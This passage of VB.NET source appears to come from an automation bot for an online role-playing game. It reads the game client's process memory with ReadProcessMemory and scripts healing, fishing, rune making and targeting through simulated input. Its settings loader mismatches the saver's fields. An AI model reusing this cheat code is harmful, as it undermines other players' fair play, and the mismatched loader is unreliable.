                If CInt(labHPActual.Text) < CInt(txtHPforHeal.Text) And CInt(labMPActual.Text) > CInt(txtMPforHeal.Text) Then
                    If Status.busy = False And Status.paused = False Then
                        capture_controls()
                        GetFocus()
                        My.Computer.Keyboard.SendKeys(txtHPSpell.Text, True)
                        My.Computer.Keyboard.SendKeys("{ENTER}", True)
                        release_controls()
                    End If
                End If
            End If
        End If
    End Sub

    'Fishing
    Private Sub TimerFishing_Tick(sender As Object, e As EventArgs) Handles TimerFishing.Tick
        If checkFishing.Checked And CInt(labCapacity.Text) > CInt(txtstopfish.Text) And labping.BackColor = Color.Green Then
            If Status.busy = False And Status.paused = False Then
                Status.busy = True

                Select Case NextFish
                    Case 0
                        sendpointX = FishPos1XY.X
                        sendpointY = FishPos1XY.Y
                    Case 1
                        sendpointX = FishPos2XY.X
                        sendpointY = FishPos2XY.Y
                    Case 2
                        sendpointX = FishPos3XY.X
                        sendpointY = FishPos3XY.Y
                    Case 3
                        sendpointX = FishPos4XY.X
                        sendpointY = FishPos4XY.Y
                    Case 4
                        sendpointX = FishPos5XY.X
                        sendpointY = FishPos5XY.Y
                    Case 5
                        sendpointX = FishPos5XY.X
                        sendpointY = FishPos5XY.Y
                    Case 6
                        sendpointX = FishPos6XY.X
                        sendpointY = FishPos6XY.Y
                    Case Else
                        NextFish = 0
                End Select
                GetFocus()
                System.Threading.Thread.Sleep(200)
                Cursor.Position() = New Point(RodPosXY.X, RodPosXY.Y)
                System.Threading.Thread.Sleep(100)
                right_click()
                movesendpoint()
                left_click()

                If Have2Fish() = True Then
                    If checkStack.Checked = True Then
                        Dim _my1Bytes(3) As Byte
                        ReadProcessMemory(_targetProcessHandle, RHandID, _my1Bytes, 4, vbNull)
                        Dim rhand = BitConverter.ToInt32(_my1Bytes, 0).ToString
                        If rhand = "2667" Then
                            System.Threading.Thread.Sleep(100)
                            Cursor.Position() = New Point(handXY.X, handXY.Y)
                            System.Threading.Thread.Sleep(100)
                            Down_Mouse()
                            Cursor.Position() = New Point(foodXY.X, foodXY.Y)
                            System.Threading.Thread.Sleep(100)
                            Up_Mouse()
                            My.Computer.Keyboard.SendKeys("{ENTER}")
                            System.Threading.Thread.Sleep(100)
                        Else
                            Cursor.Position() = New Point(StackPos2XY.X, StackPos2XY.Y)
                            System.Threading.Thread.Sleep(100)
                            Down_Mouse()
                            Cursor.Position() = New Point(StackPos1XY.X, StackPos1XY.Y)
                            System.Threading.Thread.Sleep(100)
                            Up_Mouse()
                            My.Computer.Keyboard.SendKeys("{ENTER}", True)
                        End If
                    End If
                End If
                lastcap = CInt(labCapacity.Text)
                Status.busy = False
                NextFish += 1
            End If
        End If
    End Sub

    'Save bot settings
    Private Sub butsavesettings_Click(sender As Object, e As EventArgs) Handles butsavesettings.Click
        Try
            Dim fullpath As String = Directory.GetCurrentDirectory + "\" + TextBox1.Text + ".txt"
            If File.Exists(fullpath) Then
                MsgBox("File already exists, change name or delete it!")
                Exit Sub
            Else
                Dim writesettings As New System.IO.StreamWriter(fullpath)

                With writesettings
                    .WriteLine("HP FOR SPELL HEALING")
                    .WriteLine(txtHPforHeal.Text)
                    .WriteLine("MP FOR SPELL HEALING")
                    .WriteLine(txtMPforHeal.Text)
                    .WriteLine("SPELL FOR SPELL HEALING")
                    .WriteLine(txtHPSpell.Text)
                    .WriteLine("HP FOR UH HEALING")
                    .WriteLine(txthpforuh.Text)
                    .WriteLine("UH POSITION X")
                    .WriteLine(uhXY.X)
                    .WriteLine("UH POSITION Y")
                    .WriteLine(uhXY.Y)
                    .WriteLine("CHARACTER POSITION X")
                    .WriteLine(meXY.X)
                    .WriteLine("CHARACTER POSITION Y")
                    .WriteLine(meXY.Y)
                    .WriteLine("MP FOR MANA TRAIN")
                    .WriteLine(txtMPforMana.Text)
                    .WriteLine("SPELL FOR MANA TRAIN")
                    .WriteLine(txtSpellforMana.Text)
                    .WriteLine("HAND POSITION X")
                    .WriteLine(handXY.X)
                    .WriteLine("HAND POSITION Y")
                    .WriteLine(handXY.Y)
                    .WriteLine("SPEAR GROUND POSITION X")
                    .WriteLine(TrainDropXY.X)
                    .WriteLine("SPEAR GROUND POSITION Y")
                    .WriteLine(TrainDropXY.Y)
                    .WriteLine("SPEAR COUNT FOR PICK")
                    .WriteLine(txtMinSpears.Text)
                    .WriteLine("FOOD POSITION X")
                    .WriteLine(foodXY.X)
                    .WriteLine("FOOD POSITION Y")
                    .WriteLine(foodXY.Y)
                    .WriteLine("ROD POSITION X")
                    .WriteLine(RodPosXY.X)
                    .WriteLine("ROD POSITION Y")
                    .WriteLine(RodPosXY.Y)
                    .WriteLine("STACK POSITION 1 X")
                    .WriteLine(StackPos1XY.X)
                    .WriteLine("STACK POSITION 1 Y")
                    .WriteLine(StackPos1XY.Y)
                    .WriteLine("STACK POSITION 2 X")
                    .WriteLine(StackPos2XY.X)
                    .WriteLine("STACK POSITION 2 Y")
                    .WriteLine(StackPos2XY.Y)
                    .WriteLine("ALERT HP ABOVE TEXT")
                    .WriteLine(a1txt.Text)
                    .WriteLine("ALERT HP BELOW TEXT")
                    .WriteLine(a2txt.Text)
                    .WriteLine("ALERT MP ABOVE TEXT")
                    .WriteLine(a3txt.Text)
                    .WriteLine("ALERT MP BELOW TEXT")
                    .WriteLine(a4txt.Text)
                    .WriteLine("ALERT PING ABOVE TEXT")
                    .WriteLine(a5txt.Text)
                    .WriteLine("ALERT VIP TEXT")
                    .WriteLine(txtvip.Text)
                    .WriteLine("MP TO MAKE RUNE")
                    .WriteLine(txtMPforRune.Text)
                    .WriteLine("SPELL FOR RUNE")
                    .WriteLine(txtRuneSpell.Text)
                    .WriteLine("RUNE POSITION X")
                    .WriteLine(runesXY.X)
                    .WriteLine("RUNE POSITION Y")
                    .WriteLine(runesXY.Y)
                    .WriteLine("HAND POSITION X")
                    .WriteLine(handXY.X)
                    .WriteLine("HAND POSITION Y")
                    .WriteLine(handXY.Y)
                    .WriteLine("MANA TO CLOSE RUNE BACKPACK")
                    .WriteLine(txtmanatoclose.Text)
                    .WriteLine("CLOSE RUNE BACKPACK POSITION X")
                    .WriteLine(CloseBPXY.X)
                    .WriteLine("CLOSE RUNE BACKPACK POSITION Y")
                    .WriteLine(CloseBPXY.Y)
                    .Close()
                    MsgBox("Settings saved!")
                End With
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub butloadsettings_Click(sender As Object, e As EventArgs) Handles butloadsettings.Click
        Dim fullpath As String = Directory.GetCurrentDirectory + "\" + TextBox1.Text + ".txt"
        Dim reader As New StreamReader(fullpath)
        Try
            If Not File.Exists(fullpath) Then
                MsgBox("Can't find " + fullpath)
                Exit Sub
            Else
                If "HP FOR SPELL HEALING" = reader.ReadLine() Then
                    txtHPforHeal.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find HP FOR SPELL HEALING!")
                    Exit Sub
                End If
                If "MP FOR SPELL HEALING" = reader.ReadLine() Then
                    txtMPforHeal.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find MP FOR SPELL HEALING!")
                    Exit Sub
                End If
                If "SPELL FOR SPELL HEALING" = reader.ReadLine() Then
                    txtHPSpell.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find SPELL FOR SPELL HEALING!")
                    Exit Sub
                End If
                If "HP FOR UH HEALING" = reader.ReadLine() Then
                    txthpforuh.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find HP FOR UH HEALING!")
                    Exit Sub
                End If
                If "UH POSITION X" = reader.ReadLine() Then
                    uhXY.X = reader.ReadLine()
                Else
                    MsgBox("Can't find UH POSITION X!")
                    Exit Sub
                End If
                If "UH POSITION Y" = reader.ReadLine() Then
                    uhXY.Y = reader.ReadLine()
                Else
                    MsgBox("Can't find UH POSITION Y!")
                    Exit Sub
                End If
                If "CHARACTER POSITION X" = reader.ReadLine() Then
                    meXY.X = reader.ReadLine()
                Else
                    MsgBox("Can't find CHARACTER POSITION X!")
                    Exit Sub
                End If
                If "CHARACTER POSITION Y" = reader.ReadLine() Then
                    meXY.Y = reader.ReadLine()
                Else
                    MsgBox("Can't find CHARACTER POSITION Y!")
                    Exit Sub
                End If
                If "MP FOR MANA TRAIN" = reader.ReadLine() Then
                    txtMPforMana.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find MP FOR MANA TRAIN!")
                    Exit Sub
                End If
                If "SPELL FOR MANA TRAIN" = reader.ReadLine() Then
                    txtSpellforMana.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find SPELL FOR MANA TRAIN!")
                    Exit Sub
                End If
                If "HAND POSITION X" = reader.ReadLine() Then
                    handXY.X = reader.ReadLine()
                Else
                    MsgBox("Can't find HAND POSITION X!")
                    Exit Sub
                End If
                If "HAND POSITION Y" = reader.ReadLine() Then
                    handXY.Y = reader.ReadLine()
                Else
                    MsgBox("Can't find HAND POSITION Y!")
                    Exit Sub
                End If
                If "SPEAR GROUND POSITION X" = reader.ReadLine() Then
                    TrainDropXY.X = reader.ReadLine()
                Else
                    MsgBox("Can't find SPEAR GROUND POSITION X!")
                    Exit Sub
                End If
                If "SPEAR GROUND POSITION Y" = reader.ReadLine() Then
                    TrainDropXY.Y = reader.ReadLine()
                Else
                    MsgBox("Can't find SPEAR GROUND POSITION Y!")
                    Exit Sub
                End If
                If "SPEAR COUNT FOR PICK" = reader.ReadLine() Then
                    txtMinSpears.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find SPEAR COUNT FOR PICK!")
                    Exit Sub
                End If
                If "FOOD POSITION X" = reader.ReadLine() Then
                    RodPosXY.X = reader.ReadLine()
                Else
                    MsgBox("Can't find FOOD POSITION X!")
                    Exit Sub
                End If
                If "FOOD POSITION Y" = reader.ReadLine() Then
                    RodPosXY.Y = reader.ReadLine()
                Else
                    MsgBox("Can't find FOOD POSITION Y!")
                    Exit Sub
                End If
                If "STACK POSITION 1 X" = reader.ReadLine() Then
                    StackPos1XY.X = reader.ReadLine()
                Else
                    MsgBox("Can't find STACK POSITION 1 X!")
                    Exit Sub
                End If
                If "STACK POSITION 1 Y" = reader.ReadLine() Then
                    StackPos1XY.Y = reader.ReadLine()
                Else
                    MsgBox("Can't find STACK POSITION 1 Y!")
                    Exit Sub
                End If
                If "STACK POSITION 2 X" = reader.ReadLine() Then
                    StackPos2XY.X = reader.ReadLine()
                Else
                    MsgBox("Can't find STACK POSITION 2 X!")
                    Exit Sub
                End If
                If "STACK POSITION 2 Y" = reader.ReadLine() Then
                    StackPos2XY.Y = reader.ReadLine()
                Else
                    MsgBox("Can't find STACK POSITION 2 Y!")
                    Exit Sub
                End If
                If "ALERT HP ABOVE TEXT" = reader.ReadLine() Then
                    a1txt.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find ALERT HP ABOVE TEXT!")
                    Exit Sub
                End If
                If "ALERT HP BELOW TEXT" = reader.ReadLine() Then
                    a2txt.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find ALERT HP BELOW TEXT!")
                    Exit Sub
                End If
                If "ALERT MP ABOVE TEXT" = reader.ReadLine() Then
                    a3txt.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find ALERT MP ABOVE TEXT!")
                    Exit Sub
                End If
                If "ALERT MP BELOW TEXT" = reader.ReadLine() Then
                    a4txt.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find ALERT MP BELOW TEXT!")
                    Exit Sub
                End If
                If "ALERT PING ABOVE TEXT" = reader.ReadLine() Then
                    a5txt.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find ALERT PING ABOVE TEXT!")
                    Exit Sub
                End If
                If "ALERT VIP TEXT" = reader.ReadLine() Then
                    txtvip.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find ALERT VIP TEXT!")
                    Exit Sub
                End If
                If "MP TO MAKE RUNE" = reader.ReadLine() Then
                    txtMPforRune.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find MP TO MAKE RUNE!")
                    Exit Sub
                End If
                If "SPELL FOR RUNE" = reader.ReadLine() Then
                    txtRuneSpell.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find SPELL FOR RUNE!")
                    Exit Sub
                End If
                If "RUNE POSITION X" = reader.ReadLine() Then
                    runesXY.X = reader.ReadLine()
                Else
                    MsgBox("Can't find RUNE POSITION X!")
                    Exit Sub
                End If
                If "RUNE POSITION Y" = reader.ReadLine() Then
                    runesXY.Y = reader.ReadLine()
                Else
                    MsgBox("Can't find RUNE POSITION Y!")
                    Exit Sub
                End If
                If "HAND POSITION X" = reader.ReadLine() Then
                    handXY.X = reader.ReadLine()
                Else
                    MsgBox("Can't find HAND POSITION X!")
                    Exit Sub
                End If
                If "HAND POSITION Y" = reader.ReadLine() Then
                    handXY.Y = reader.ReadLine()
                Else
                    MsgBox("Can't find HAND POSITION Y!")
                    Exit Sub
                End If
                If "MANA TO CLOSE RUNE BACKPACK" = reader.ReadLine() Then
                    txtmanatoclose.Text = reader.ReadLine()
                Else
                    MsgBox("Can't find MANA TO CLOSE RUNE BACKPACK!")
                    Exit Sub
                End If
                If "CLOSE RUNE BACKPACK POSITION X" = reader.ReadLine() Then
                    CloseBPXY.X = reader.ReadLine()
                Else
                    MsgBox("Can't find CLOSE RUNE BACKPACK POSITION X!")
                    Exit Sub
                End If
                If "CLOSE RUNE BACKPACK POSITION Y" = reader.ReadLine() Then
                    CloseBPXY.Y = reader.ReadLine()
                Else
                    MsgBox("Can't find CLOSE RUNE BACKPACK POSITION Y!")
                    Exit Sub
                End If

                MsgBox("Load ok!")
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
        reader.Close()
    End Sub

    Private Sub recording_assistant(ByRef XY As POINT_API, ByVal msg_text As String, ByRef item As CheckBox)
        If XY.X = 0 And XY.Y = 0 Then
            MsgBox("Put mouse at " + msg_text + " spot and wait for confirmation.")
            System.Threading.Thread.Sleep(4000)
            GetMouseXY(XY)
        End If
    End Sub

    Private Sub checkUHHEAL_CheckedChanged(sender As Object, e As EventArgs) Handles checkUHHEAL.CheckedChanged
        capture_controls()
        recording_assistant(meXY, "CHARACTER", checkUHHEAL)
        recording_assistant(uhXY, "UH", checkUHHEAL)
        release_controls()
    End Sub

    Private Sub checktrainer_CheckedChanged(sender As Object, e As EventArgs) Handles checktrainer.CheckedChanged
        capture_controls()
        recording_assistant(TrainHandXY, "SPEARS HAND", checktrainer)
        recording_assistant(TrainDropXY, "GROUND WHERE THE SPEARS ARE DROPPED", checktrainer)
        If ComboTargets.Text = "2" Then
            recording_assistant(TrainDrop2XY, "SECOND SPOT TO GET SPEARS", checktrainer)
        End If
        release_controls()
    End Sub

    Private Sub checkeatfood_CheckedChanged(sender As Object, e As EventArgs) Handles checkeatfood.CheckedChanged
        capture_controls()
        recording_assistant(foodXY, "FOOD", checkeatfood)
        release_controls()
    End Sub

    Private Sub checkFishing_CheckedChanged(sender As Object, e As EventArgs) Handles checkFishing.CheckedChanged
        capture_controls()
        recording_assistant(RodPosXY, "FISHING ROD", checkFishing)
        If FishPos1XY.X = 0 And FishPos1XY.Y = 0 Then
            checkFishing.Checked = False
            MsgBox("Please, record fishing spots!")
        ElseIf FishPos2XY.X = 0 And FishPos2XY.Y = 0 Then
            checkFishing.Checked = False
            MsgBox("Please, record fishing spots!")
        ElseIf FishPos3XY.X = 0 And FishPos3XY.Y = 0 Then
            checkFishing.Checked = False
            MsgBox("Please, record fishing spots!")
        ElseIf FishPos4XY.X = 0 And FishPos4XY.Y = 0 Then
            checkFishing.Checked = False
            MsgBox("Please, record fishing spots!")
        ElseIf FishPos5XY.X = 0 And FishPos5XY.Y = 0 Then
            checkFishing.Checked = False
            MsgBox("Please, record fishing spots!")
        ElseIf FishPos6XY.X = 0 And FishPos6XY.Y = 0 Then
            checkFishing.Checked = False
            MsgBox("Please, record fishing spots!")
        End If
        release_controls()
    End Sub

    'Activar / desactivar targeting
    Private Sub checktargeting_CheckedChanged(sender As Object, e As EventArgs) Handles checktargeting.CheckedChanged
        capture_controls()
        recording_assistant(battle1XY, "FIRST BATTLE LIST INDEX", checktargeting)

        'Calcular salto de battle list
        Dim battledifXY As Integer = battle2XY.Y - battle1XY.Y
        battle3XY.X = battle1XY.X
        If battledifXY > 0 Then
            battle3XY.Y = battle2XY.Y + battledifXY
        Else
            battle3XY.Y = battle2XY.Y - Math.Abs(battledifXY)
        End If

        recording_assistant(battle2XY, "SECOND BATTLE LIST INDEX", checktargeting)
        recording_assistant(chasingXY, "CHASING BUTTON", checktargeting)
        release_controls()
    End Sub


    Private Sub checkStack_CheckedChanged(sender As Object, e As EventArgs) Handles checkStack.CheckedChanged
        capture_controls()
        recording_assistant(StackPos1XY, "FIRST BACKPACK FIRST SLOT", checkStack)
        recording_assistant(StackPos2XY, "FIRST BACKPACK SECOND SLOT", checkStack)
        release_controls()
    End Sub

    Private Sub checkRuneMaker_CheckedChanged(sender As Object, e As EventArgs) Handles checkRuneMaker.CheckedChanged
        capture_controls()
        recording_assistant(runesXY, "RUNE", checkRuneMaker)
        recording_assistant(handXY, "RIGHT HAND", checkRuneMaker)
        release_controls()
    End Sub

    Private Sub checkCloseTime_CheckedChanged(sender As Object, e As EventArgs) Handles checkCloseTime.CheckedChanged
        capture_controls()
        recording_assistant(CloseBPXY, "CLOSE BP", checkCloseTime)
        release_controls()
    End Sub

    Private Sub pausebot()
        capture_controls()
        PictureBox1.Image = My.Resources.banner_grey
    End Sub

    Private Sub resumebot()
        PictureBox1.Image = My.Resources.banner_green
        release_controls()
    End Sub

    'Show buttons panel
    Private Sub Button3_Click_4(sender As Object, e As EventArgs) Handles Button3.Click
        If Me.Size.Height = 562 Then
            Me.Size = New Size(Me.Width, 707)
            panel1.Visible = True
            panel2.Visible = True
            panel3.Visible = True
            panel4.Visible = True
            panel5.Visible = True
            panel6.Visible = True
            panel7.Visible = True
        ElseIf Me.Size.Height = 707 Then
            Me.Size = New Size(Me.Width, 562)
            panel1.Visible = False
            panel2.Visible = False
            panel3.Visible = False
            panel4.Visible = False
            panel5.Visible = False
            panel6.Visible = False
            panel7.Visible = False
        Else
            Dim result As Integer = MessageBox.Show("I need to resize your bot window." + vbCrLf + "Else this button won't work.", "Unexpected window size", MessageBoxButtons.YesNo)
            If result = DialogResult.No Then
                Exit Sub
            ElseIf result = DialogResult.Yes Then
                Me.Size = New Size(Me.Width, 562)
                MsgBox("Bot resized!" + vbCrLf + "You should now be able to load buttons panel.")
            End If
        End If
    End Sub

    'Position xyz
    Private Sub posxyz()
        Dim _myBytes(3) As Byte
        'Get X pos
        ReadProcessMemory(_targetProcessHandle, posX, _myBytes, 4, vbNull)
        txtXpos.Text = BitConverter.ToInt32(_myBytes, 0).ToString

        'Get Y pos
        ReadProcessMemory(_targetProcessHandle, posY, _myBytes, 4, vbNull)
        txtYpos.Text = BitConverter.ToInt32(_myBytes, 0).ToString

        'Get Z pos
        ReadProcessMemory(_targetProcessHandle, posZ, _myBytes, 4, vbNull)
        txtZpos.Text = BitConverter.ToInt32(_myBytes, 0).ToString
    End Sub



    'Show HELP FORM
    Private Sub butHelp_Click(sender As Object, e As EventArgs) Handles butHelp.Click
        Dim webAddress As String = "http://www.kuhiscripts.com/"
        Process.Start(webAddress)
    End Sub

    Private Sub butuhpos_Click(sender As Object, e As EventArgs) Handles butuhpos.Click
        TimerUHPos.Enabled = True
    End Sub
    Private Sub TimerUHPos_Tick(sender As Object, e As EventArgs) Handles TimerUHPos.Tick
        GetMouseXY(uhXY)
        TimerUHPos.Stop()
    End Sub

    Private Sub butmepos_Click(sender As Object, e As EventArgs) Handles butmepos.Click
        TimerMEPos.Enabled = True
    End Sub
    Private Sub TimerMEPos_Tick(sender As Object, e As EventArgs) Handles TimerMEPos.Tick
        GetMouseXY(meXY)
        TimerMEPos.Stop()
    End Sub

    Private Sub butTrainHand_Click(sender As Object, e As EventArgs) Handles butTrainHand.Click
        TimerHandTrain.Enabled = True
    End Sub

    Private Sub butGroundPos_Click(sender As Object, e As EventArgs) Handles butGroundPos.Click
        TimerSpearPos.Enabled = True
    End Sub

    Private Sub butFoodPos_Click(sender As Object, e As EventArgs) Handles butFoodPos.Click
        TimerFoodPos.Enabled = True
    End Sub

    Private Sub Button10_Click_2(sender As Object, e As EventArgs) Handles butrodpos.Click
        TimerRodPos.Enabled = True
    End Sub

    Private Sub butSlot1_Click_1(sender As Object, e As EventArgs) Handles butSlot1.Click
        TimerSlot1.Enabled = True
    End Sub

    Private Sub butSlot2_Click_1(sender As Object, e As EventArgs) Handles butSlot2.Click
        TimerSlot2.Enabled = True
    End Sub

    Private Sub butRunePos_Click(sender As Object, e As EventArgs) Handles butRunePos.Click
        TimerRunePos.Enabled = True
    End Sub

    Private Sub butHandPos_Click_1(sender As Object, e As EventArgs) Handles butHandPos.Click
        TimerHandPos.Enabled = True
    End Sub

    Private Sub butClosePosition_Click_1(sender As Object, e As EventArgs) Handles butClosePosition.Click
        timerBPClosePos.Enabled = True
    End Sub

    Private Sub butbat1pos_Click(sender As Object, e As EventArgs) Handles butbat1pos.Click
        TimerBattle1.Enabled = True
    End Sub

    Private Sub butbat2pos_Click(sender As Object, e As EventArgs) Handles butbat2pos.Click
        TimerBattle2.Enabled = True
    End Sub

    Private Sub butchasingpos_Click(sender As Object, e As EventArgs) Handles butchasingpos.Click
        TimerChasingPos.Enabled = True
    End Sub

    Private Sub TimerBattle2_Tick_1(sender As Object, e As EventArgs) Handles TimerBattle2.Tick
        GetMouseXY(battle2XY)
        TimerBattle2.Stop()
    End Sub

    Private Sub butLoadWaypoints_Click(sender As Object, e As EventArgs) Handles butLoadWaypoints.Click
        loadTXTwaypoints(listX, listY, listZ, WPTXTname.Text)
    End Sub

    Private Sub checkautochase_CheckedChanged(sender As Object, e As EventArgs) Handles checkautochase.CheckedChanged
        capture_controls()
        recording_assistant(chasingXY, "CHASE", checkautochase)
        release_controls()
    End Sub

    Private Sub checktargets_CheckedChanged_1(sender As Object, e As EventArgs) Handles checktargets.CheckedChanged
        If txttargetsecs.Text <> "0" Then
            capture_controls()
            recording_assistant(firsttargetXY, "FIRST TARGET", checktargets)
            recording_assistant(secondtargetXY, "SECOND TARGET", checktargets)
            TimerChangeTarget.Interval = CInt(txttargetsecs.Text) * 1000
            TimerChangeTarget.Enabled = True
            release_controls()
        Else
            checktargets.Checked = False
        End If
    End Sub

    Private Sub TimerChangeTarget_Tick(sender As Object, e As EventArgs) Handles TimerChangeTarget.Tick
        If checktargets.Checked = True And Status.busy = False And Status.paused = False Then
            capture_controls()
            If targetingid = 1 Then
                targetingid = 2
                GetFocus()
                Cursor.Position() = New Point(secondtargetXY.X, secondtargetXY.Y)
                System.Threading.Thread.Sleep(100)
                right_click()
            Else
                targetingid = 1
                GetFocus()
                Cursor.Position() = New Point(firsttargetXY.X, firsttargetXY.Y)
                System.Threading.Thread.Sleep(100)
                right_click()
            End If
            release_controls()
        End If
    End Sub
End Class